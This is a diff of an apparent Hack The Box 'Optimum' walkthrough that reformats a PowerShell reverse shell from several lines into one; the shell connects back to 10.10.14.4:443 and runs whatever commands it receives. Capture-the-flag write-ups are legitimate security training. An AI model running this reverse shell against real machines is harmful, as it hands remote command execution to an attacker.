@@ -91,13 +91,7 @@ We got serve response. Now let’s to attack!
 First, the powershell reverse shell command was encoded in base64:
 
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient("10.10.14.4",443); $stream = $client.GetStream(); \ 
-[byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; \
- $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); \
- $sendback = (Invoke-Expression $data 2>&1 | Out-String ); \
- $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; \
- $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); \
- $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.4",443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()
 ```
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Optimum/Untitled%206.png)
